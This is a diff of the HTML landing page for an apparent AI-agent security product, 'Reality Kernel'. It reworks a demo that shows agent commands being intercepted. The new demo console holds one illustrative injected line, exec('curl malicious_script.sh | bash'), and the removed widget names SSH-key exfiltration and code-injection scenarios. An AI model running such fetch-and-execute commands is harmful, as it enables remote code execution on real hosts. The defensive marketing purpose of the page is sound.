@@ -74,239 +74,73 @@
     <!-- ════════════════════════════════════════════════════════════════════
          HERO · headline + Execution Sandbox Layer
          ════════════════════════════════════════════════════════════════════ -->
-    <section class="relative overflow-hidden">
-      <div class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 pt-14 pb-10 sm:pt-20">
+    <section class="relative overflow-hidden elite-canvas">
+      <div aria-hidden="true" class="pointer-events-none absolute -left-20 top-8 h-72 w-72 rounded-full bg-slate-200/50 blur-3xl"></div>
+      <div aria-hidden="true" class="pointer-events-none absolute -right-24 top-24 h-80 w-80 rounded-full bg-sky-100/45 blur-3xl"></div>
+      <div class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 pt-14 pb-14 sm:pt-20">
 
-        <div class="mx-auto max-w-3xl text-center">
-          <span class="eyebrow justify-center animate-fade-up">
-            <span class="relative flex h-2 w-2">
-              <span class="absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75 animate-ping-slow"></span>
-              <span class="relative inline-flex h-2 w-2 rounded-full bg-emerald-500"></span>
-            </span>
-            Execution-layer security · API v0.4.2 live
-          </span>
-          <h1 class="mt-5 text-4xl sm:text-5xl lg:text-[3.5rem] lg:leading-[1.08] font-bold tracking-tight text-slate-900 text-balance animate-fade-up [animation-delay:60ms]">
-            Your AI agent can run commands.<br class="hidden sm:block" />
-            <span class="text-slate-500">We decide which ones actually happen.</span>
+        <div class="mx-auto max-w-4xl text-center">
+          <span class="eyebrow justify-center animate-fade-up border border-slate-200/50 bg-white/70 px-3 py-1.5 rounded-full">Execution-layer security · API v0.4.2 live</span>
+          <h1 class="mt-6 font-extrabold tracking-tighter leading-[1.1] text-[2.75rem] lg:text-[4rem] text-balance animate-fade-up [animation-delay:60ms]">
+            <span class="text-slate-900">Your AI agent can run commands.</span><br class="hidden sm:block" />
+            <span class="text-slate-400">We decide which ones actually happen.</span>
           </h1>
-          <p class="mt-6 text-lg leading-8 text-slate-600 text-balance animate-fade-up [animation-delay:120ms]">
-            Reality Kernel sits between an autonomous agent and your infrastructure. Every system call is
-            simulated against the agent's stated goal, judged in under a millisecond, and sealed with an
-            Ed25519 signature — <em class="not-italic font-semibold text-slate-800">before</em> it touches a real host.
+          <p class="mt-6 text-slate-600 text-base lg:text-lg leading-relaxed max-w-2xl mx-auto animate-fade-up [animation-delay:120ms]">
+            Reality Kernel simulates every autonomous agent system call against its intended goal. We provide sub-millisecond, cryptographic interception before any malicious code can execute on your real host.
           </p>
           <div class="mt-8 flex flex-wrap items-center justify-center gap-3 animate-fade-up [animation-delay:180ms]">
-            <a href="/login#request" class="btn-primary" data-auth="request">Request Access</a>
+            <a href="/login#request" class="bg-slate-900 text-white hover:bg-slate-800 font-medium tracking-wide text-sm px-6 py-2.5 rounded-lg shadow-sm transition-all" data-auth="request">Request Access</a>
             <a href="/docs" class="btn-secondary">Read the integration guide</a>
           </div>
-          <p class="mt-4 font-mono text-xs text-slate-500 animate-fade-up [animation-delay:220ms]">
-            pip install reality-kernel &nbsp;·&nbsp; 3 lines to integrate &nbsp;·&nbsp; verdicts p50 <span class="chip">0.31 ms</span>
-          </p>
+          <div class="mt-4 flex flex-wrap items-center justify-center font-mono text-[11px] font-medium tracking-widest text-slate-400 uppercase gap-6 animate-fade-up [animation-delay:220ms]">
+            <span>pip install reality-kernel</span>
+            <span>3 lines to integrate</span>
+            <span>verdicts p50 0.31ms</span>
+          </div>
         </div>
 
-        <!-- ──────────────────────────────────────────────────────────────────
-             EXECUTION SANDBOX LAYER · the interactive centrepiece
-             ────────────────────────────────────────────────────────────────── -->
-        <div id="sandbox" class="mt-14 sm:mt-16 animate-fade-up [animation-delay:260ms]">
-          <div class="card overflow-hidden shadow-window">
+        <div id="threat-sandbox" class="grid grid-cols-1 lg:grid-cols-2 gap-8 max-w-5xl mx-auto mt-12 animate-fade-up [animation-delay:260ms]">
+          <section class="bg-slate-900 text-slate-100 rounded-xl p-4 font-mono text-xs shadow-xl border border-slate-700/70">
+            <div class="flex items-center justify-between gap-2">
+              <span class="text-slate-400 uppercase tracking-[0.2em] text-[10px]">Threat Matrix Console</span>
+              <span id="ts-console-state" class="text-[10px] text-slate-500">Baseline execution</span>
+            </div>
+            <div id="ts-console-output" class="mt-4 space-y-1.5 min-h-[180px]">
+              <p class="terminal-line">$ intent: fetch weather data for New York</p>
+              <p class="terminal-line">$ command: cat ./cache/weather.json</p>
+              <p class="terminal-line text-emerald-300">[RK] intent alignment score 0.99</p>
+              <p id="ts-injected-command" class="terminal-line opacity-0">exec(&quot;curl malicious_script.sh | bash&quot;)</p>
+            </div>
+            <div class="mt-5 grid grid-cols-1 sm:grid-cols-3 gap-2" role="group" aria-label="Scenario utility buttons">
+              <button type="button" class="sim-btn is-active" data-threat="safe">Simulate Safe Task</button>
+              <button type="button" class="sim-btn" data-threat="rogue">Simulate Internal Rogue Loop</button>
+              <button type="button" class="sim-btn" data-threat="injection">Simulate External Prompt Injection</button>
+            </div>
+          </section>
 
-            <!-- window chrome -->
-            <div class="flex items-center justify-between gap-4 border-b border-slate-200/80 bg-slate-50/70 px-4 py-2.5">
-              <div class="flex items-center gap-3">
-                <div class="flex items-center gap-1.5">
-                  <span class="window-dot bg-slate-300"></span>
-                  <span class="window-dot bg-slate-300"></span>
-                  <span class="window-dot bg-slate-300"></span>
-                </div>
-                <span class="font-mono text-xs font-medium text-slate-600">Execution Sandbox Layer</span>
-                <span class="hidden sm:inline chip">agent_pid 4188</span>
+          <section class="bg-white border border-slate-200/60 rounded-xl p-6 relative overflow-hidden flex items-center justify-center shadow-[0_22px_55px_-28px_rgba(15,23,42,0.35)]">
+            <div class="absolute inset-0 blueprint opacity-70"></div>
+            <svg class="absolute inset-0 h-full w-full" viewBox="0 0 560 320" fill="none" aria-hidden="true">
+              <path id="ts-trace-safe" class="trace-safe" d="M44 166 C 140 166, 168 160, 230 160" stroke="#10b981" stroke-width="3" stroke-linecap="round"/>
+              <path id="ts-trace-agent" class="trace-agent" d="M286 160 C 360 160, 390 160, 472 160" stroke="#f97316" stroke-width="3" stroke-linecap="round"/>
+              <path id="ts-trace-attack" class="trace-attack" d="M516 66 C 442 72, 340 110, 150 144" stroke="#dc2626" stroke-width="3" stroke-linecap="round"/>
+            </svg>
+
+            <div id="ts-attacker-box" class="absolute right-7 top-7 rounded-lg border border-red-200 bg-red-50 px-3 py-2 font-mono text-[10px] tracking-wide text-red-600 opacity-0 transition-opacity duration-200">ATTACKER BOX</div>
+
+            <div id="ts-shield" class="absolute left-[68%] top-1/2 -translate-y-1/2 rounded-xl border border-slate-300/80 bg-white/95 px-3 py-1.5 font-mono text-[10px] tracking-[0.16em] text-slate-500 transition-all duration-200">RK SHIELD</div>
+
+            <div id="ts-agent-node" class="relative z-10 flex flex-col items-center gap-3 transition-all duration-200">
+              <div class="h-20 w-20 rounded-full border border-slate-300 bg-slate-100/90 grid place-items-center shadow-sm">
+                <span class="h-7 w-7 rounded-full bg-emerald-500 shadow-[0_0_0_8px_rgba(16,185,129,0.15)] animate-pulse"></span>
               </div>
-              <div class="flex items-center gap-2 font-mono text-[11px] text-slate-500">
-                <span class="hidden sm:inline">engine</span>
-                <span id="sb-engine-status" class="inline-flex items-center gap-1.5 rounded-full border border-slate-200 bg-white px-2 py-0.5">
-                  <span class="h-1.5 w-1.5 rounded-full bg-emerald-500"></span>
-                  <span data-status-label>live</span>
-                </span>
-              </div>
+              <span class="font-mono text-[11px] tracking-[0.18em] text-slate-500 uppercase">agent_pid: 4188</span>
             </div>
 
-            <!-- three-column stage -->
-            <div class="grid grid-cols-1 lg:grid-cols-[minmax(0,1fr)_minmax(0,1.35fr)_minmax(0,1fr)]">
+            <div id="ts-host-core" class="absolute right-8 top-1/2 -translate-y-1/2 rounded-lg border border-slate-200 bg-slate-50 px-3 py-2 font-mono text-[10px] text-slate-500">core_host.sys</div>
 
-              <!-- LEFT · Agent panel -->
-              <section class="border-b border-slate-200/80 p-5 sm:p-6 lg:border-b-0 lg:border-r" aria-labelledby="sb-agent-title">
-                <div class="flex items-center justify-between">
-                  <h2 id="sb-agent-title" class="eyebrow">
-                    <svg class="h-3.5 w-3.5 text-slate-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="7" width="18" height="12" rx="3"/><path d="M12 3v4M8 13h.01M16 13h.01"/></svg>
-                    Autonomous agent
-                  </h2>
-                  <span class="chip">weather-bot</span>
-                </div>
-
-                <div class="mt-4 rounded-xl border border-slate-200/80 bg-slate-50/60 p-4">
-                  <div class="text-[11px] font-medium uppercase tracking-wider text-slate-400">Goal</div>
-                  <p class="mt-1 text-[15px] font-semibold tracking-tight text-slate-900">Fetch weather data for New York</p>
-                  <div class="mt-3 flex flex-wrap gap-1.5">
-                    <span class="chip">intent_hash 0x4c11d8aa</span>
-                    <span class="chip">n_worlds 5</span>
-                  </div>
-                </div>
-
-                <div class="mt-4">
-                  <div class="text-[11px] font-medium uppercase tracking-wider text-slate-400">Attempted action</div>
-                  <div id="sb-command" class="mt-1.5 rounded-lg border border-slate-200 bg-white px-3 py-2.5 font-mono text-xs leading-5 text-slate-700 break-all min-h-[2.75rem]">
-                    <span class="text-emerald-600">$</span> <span data-cmd>cat ./cache/weather.json</span>
-                  </div>
-                  <p id="sb-command-note" class="mt-2 text-xs leading-5 text-slate-500">Reads the cached forecast file. This is what the agent <span class="font-medium text-slate-700">should</span> be doing.</p>
-                </div>
-
-                <dl class="mt-5 grid grid-cols-2 gap-2 text-xs">
-                  <div class="rounded-lg border border-slate-200/80 bg-white px-3 py-2">
-                    <dt class="text-slate-400">Capability</dt>
-                    <dd id="sb-capability" class="mt-0.5 font-mono font-medium text-slate-700">READ</dd>
-                  </div>
-                  <div class="rounded-lg border border-slate-200/80 bg-white px-3 py-2">
-                    <dt class="text-slate-400">Divergence</dt>
-                    <dd id="sb-divergence" class="mt-0.5 font-mono font-medium text-slate-700 tabular">0.00</dd>
-                  </div>
-                </dl>
-              </section>
-
-              <!-- CENTER · Interception Wall -->
-              <section class="relative border-b border-slate-200/80 p-5 sm:p-6 lg:border-b-0 lg:border-r blueprint" aria-labelledby="sb-wall-title">
-                <div class="flex items-center justify-between">
-                  <h2 id="sb-wall-title" class="eyebrow">
-                    <svg class="h-3.5 w-3.5 text-slate-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3l8 3v6c0 5-3.5 8.5-8 9-4.5-.5-8-4-8-9V6l8-3z"/></svg>
-                    Reality Kernel interception wall
-                  </h2>
-                  <span id="sb-phase" class="font-mono text-[11px] text-slate-400">idle</span>
-                </div>
-
-                <!-- stage -->
-                <div id="sb-stage" data-state="idle" class="group relative mt-4 h-[248px] select-none rounded-xl border border-slate-200/80 bg-white/70">
-
-                  <!-- pipeline (SVG lines drawn behind nodes) -->
-                  <svg class="absolute inset-0 h-full w-full" viewBox="0 0 400 248" preserveAspectRatio="none" aria-hidden="true">
-                    <!-- base rails -->
-                    <line x1="70" y1="124" x2="330" y2="124" stroke="#e2e8f0" stroke-width="2" />
-                    <!-- trusted flow: agent -> host (green) -->
-                    <path id="sb-rail-safe" d="M70 124 H 200" fill="none" stroke="#10b981" stroke-width="2.5" stroke-linecap="round" stroke-dasharray="6 6" class="opacity-0 transition-opacity duration-300 [.is-safe_&]:opacity-100 [.is-safe_&]:animate-dash" />
-                    <!-- hostile flow: attacker -> agent (red), animated via stroke-dashoffset -->
-                    <path id="sb-rail-attack" d="M330 124 H 200" fill="none" stroke="#ef4444" stroke-width="3" stroke-linecap="round" pathLength="100" stroke-dasharray="100" stroke-dashoffset="100" style="transition: stroke-dashoffset .55s cubic-bezier(.16,1,.3,1), opacity .3s;" class="opacity-0" />
-                    <!-- warn flow (amber) -->
-                    <path id="sb-rail-warn" d="M330 124 H 200" fill="none" stroke="#f59e0b" stroke-width="3" stroke-linecap="round" pathLength="100" stroke-dasharray="100" stroke-dashoffset="100" style="transition: stroke-dashoffset .55s cubic-bezier(.16,1,.3,1), opacity .3s;" class="opacity-0" />
-                  </svg>
-
-                  <!-- AGENT node (left) -->
-                  <div class="absolute left-[8%] top-1/2 -translate-y-1/2 flex flex-col items-center gap-2">
-                    <div class="relative grid h-16 w-16 place-items-center">
-                      <span class="absolute inset-0 rounded-full border border-emerald-400/50 animate-pulse-ring"></span>
-                      <span class="absolute inset-0 rounded-full border border-emerald-400/30 animate-pulse-ring [animation-delay:1.2s]"></span>
-                      <span id="sb-agent-node" class="relative grid h-9 w-9 place-items-center rounded-full bg-white ring-1 ring-slate-200 shadow-sm animate-float transition-all duration-300">
-                        <span class="h-3.5 w-3.5 rounded-full bg-gradient-to-br from-emerald-400 to-emerald-600 shadow-[0_0_0_3px_rgb(16_185_129_/_0.15)]"></span>
-                      </span>
-                    </div>
-                    <span class="font-mono text-[10px] uppercase tracking-wider text-slate-500">agent</span>
-                  </div>
-
-                  <!-- SHIELD INTERCEPT WALL (center) -->
-                  <div class="absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 flex flex-col items-center gap-2">
-                    <div id="sb-shield" class="relative grid h-[124px] w-[64px] place-items-center rounded-2xl border border-slate-200 bg-white/90 shadow-sm transition-all duration-200">
-                      <!-- wall slats -->
-                      <div class="absolute inset-x-3 inset-y-3 grid grid-rows-6 gap-1 opacity-70" aria-hidden="true">
-                        <span class="rounded-sm bg-slate-100"></span><span class="rounded-sm bg-slate-100"></span><span class="rounded-sm bg-slate-100"></span>
-                        <span class="rounded-sm bg-slate-100"></span><span class="rounded-sm bg-slate-100"></span><span class="rounded-sm bg-slate-100"></span>
-                      </div>
-                      <svg id="sb-shield-icon" class="relative h-7 w-7 text-slate-500 transition-colors duration-200" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3l8 3v6c0 5-3.5 8.5-8 9-4.5-.5-8-4-8-9V6l8-3z"/><path id="sb-shield-check" d="M9 12l2 2 4-4" class="opacity-0 transition-opacity"/><path id="sb-shield-x" d="M9.5 9.5l5 5M14.5 9.5l-5 5" class="opacity-0 transition-opacity"/></svg>
-                    </div>
-                    <span class="font-mono text-[10px] uppercase tracking-wider text-slate-500">shield intercept</span>
-                  </div>
-
-                  <!-- ATTACKER / external node (right) -->
-                  <div class="absolute right-[8%] top-1/2 -translate-y-1/2 flex flex-col items-center gap-2">
-                    <div id="sb-attacker-node" class="grid h-12 w-12 place-items-center rounded-xl border border-dashed border-slate-300 bg-white text-slate-400 transition-all duration-300">
-                      <svg class="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l3 3h4v4l3 3-3 3v4h-4l-3 3-3-3H5v-4l-3-3 3-3V5h4l3-3z"/><path d="M12 8v4M12 16h.01"/></svg>
-                    </div>
-                    <span class="font-mono text-[10px] uppercase tracking-wider text-slate-500">external</span>
-                  </div>
-
-                  <!-- impact flash -->
-                  <div id="sb-flash" class="pointer-events-none absolute inset-0 rounded-xl bg-red-500/0 transition-colors duration-150"></div>
-                </div>
-
-                <!-- verdict readout -->
-                <div class="mt-4 flex flex-wrap items-center justify-between gap-3">
-                  <div id="sb-verdict" class="verdict-badge idle" role="status" aria-live="polite">
-                    <span class="h-1.5 w-1.5 rounded-full bg-current opacity-70"></span>
-                    <span data-verdict-text>VERDICT: — • TIME: —</span>
-                  </div>
-                  <div class="flex items-center gap-2 font-mono text-[11px] text-slate-500">
-                    <span>proof</span>
-                    <span id="sb-proof" class="chip">SHA-256 · —</span>
-                  </div>
-                </div>
-              </section>
-
-              <!-- RIGHT · Attacker Vector -->
-              <section class="p-5 sm:p-6" aria-labelledby="sb-attack-title">
-                <div class="flex items-center justify-between">
-                  <h2 id="sb-attack-title" class="eyebrow">
-                    <svg class="h-3.5 w-3.5 text-slate-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12h18M13 6l6 6-6 6"/></svg>
-                    Attacker vector
-                  </h2>
-                  <span class="chip">simulation</span>
-                </div>
-                <p class="mt-3 text-xs leading-5 text-slate-500">Pick a scenario. The command is sent to the real engine and the verdict you see is the engine's — not a scripted animation.</p>
-
-                <div class="mt-4 flex flex-col gap-2" role="group" aria-label="Simulation scenarios">
-                  <button type="button" class="sim-btn sim-btn-safe justify-start is-active" data-scenario="safe">
-                    <span class="h-2 w-2 rounded-full bg-emerald-500"></span>
-                    Simulate Safe Command
-                  </button>
-                  <button type="button" class="sim-btn sim-btn-danger justify-start" data-scenario="traversal">
-                    <span class="h-2 w-2 rounded-full bg-red-500"></span>
-                    <span class="text-left">Simulate Symlink Directory Traversal Exploit</span>
-                  </button>
-                  <button type="button" class="sim-btn sim-btn-danger justify-start" data-scenario="exfil">
-                    <span class="h-2 w-2 rounded-full bg-red-500"></span>
-                    Simulate SSH Key Exfiltration
-                  </button>
-                  <button type="button" class="sim-btn sim-btn-danger justify-start" data-scenario="rce">
-                    <span class="h-2 w-2 rounded-full bg-red-500"></span>
-                    Simulate Remote Code Injection
-                  </button>
-                  <button type="button" class="sim-btn sim-btn-warn justify-start" data-scenario="fetch">
-                    <span class="h-2 w-2 rounded-full bg-amber-500"></span>
-                    Simulate Unlisted Network Call
-                  </button>
-                </div>
-
-                <div class="mt-5">
-                  <div class="flex items-center justify-between">
-                    <span class="text-[11px] font-medium uppercase tracking-wider text-slate-400">Evidence</span>
-                    <span id="sb-worlds" class="font-mono text-[11px] text-slate-400">worlds 0/0</span>
-                  </div>
-                  <ul id="sb-evidence" class="mt-2 space-y-1.5 text-xs text-slate-600 min-h-[3.5rem]">
-                    <li class="text-slate-400">No evidence — run a scenario.</li>
-                  </ul>
-                </div>
-              </section>
-            </div>
-
-            <!-- footer log -->
-            <div class="border-t border-slate-200/80 bg-slate-50/70 px-4 py-3 sm:px-6">
-              <div class="flex items-center justify-between">
-                <span class="text-[11px] font-medium uppercase tracking-wider text-slate-400">Audit log</span>
-                <span class="font-mono text-[11px] text-slate-400">action_id <span id="sb-action-id" class="chip">—</span></span>
-              </div>
-              <div id="sb-log" class="mt-2 space-y-0.5 h-[68px] overflow-hidden">
-                <div class="log-line"><time>00:00.000</time><span>kernel ready · Ed25519 signing active · awaiting first action</span></div>
-              </div>
-            </div>
-          </div>
-
-          <p class="mt-4 text-center text-xs text-slate-500">
-            Live verdicts come from <span class="chip">POST /v1/demo</span>. Rate-limited to 10 requests/min per visitor; recorded results are shown once the limit is reached.
-          </p>
+            <div id="ts-verdict" class="absolute left-1/2 bottom-5 -translate-x-1/2 inline-flex items-center gap-2 rounded-lg border border-slate-200 bg-slate-50 px-3 py-1.5 font-mono text-[11px] font-semibold tracking-wide text-slate-500">[ VERDICT: STANDBY ]</div>
+          </section>
         </div>
       </div>
     </section>
@@ -459,7 +293,7 @@ rk = RealityKernel(api_key=<span class="text-emerald-700">"rk_live_…"</span>)
         <div class="relative">
           <span class="eyebrow justify-center !text-slate-400">Private beta</span>
           <h2 class="mt-3 text-3xl sm:text-4xl font-bold tracking-tight text-white text-balance">Put a kernel between your agents and reality.</h2>
-          <p class="mx-auto mt-4 max-w-xl text-base leading-7 text-slate-300">Developer tier is free: 1,000 signed verdicts a month, full API access, no card. Starter begins at $99/month.</p>
+          <p class="mx-auto mt-4 max-w-xl text-base leading-7 text-slate-300">Developer tier is free for registered users: 500 credits to start, full API access, no card. Starter begins at $99/month.</p>
           <div class="mt-8 flex flex-wrap items-center justify-center gap-3">
             <a href="/login#request" class="inline-flex items-center justify-center gap-2 rounded-lg bg-white px-5 py-2.5 text-sm font-semibold text-slate-900 shadow-sm transition hover:bg-slate-100 active:scale-[0.98]" data-auth="request">Request Access</a>
             <a href="/pricing" class="inline-flex items-center justify-center gap-2 rounded-lg border border-white/15 bg-white/5 px-5 py-2.5 text-sm font-semibold text-white transition hover:bg-white/10 active:scale-[0.98]">See pricing</a>
